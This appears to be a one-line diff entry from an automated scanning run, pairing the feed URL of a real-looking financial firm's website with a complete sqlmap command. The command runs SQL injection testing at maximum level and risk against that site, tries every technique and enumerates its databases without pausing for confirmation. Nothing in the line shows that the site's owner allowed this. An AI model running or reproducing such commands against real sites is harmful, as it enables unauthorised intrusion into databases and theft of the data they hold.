@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/feeds/all.atom.xml (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/feeds/all.atom.xml --batch --level=5 --risk=3 --dbs --threads=4 --output-dir=tool_outputs/ph/sm_15 -p id --technique=BEUSTQ --skip-heuristic
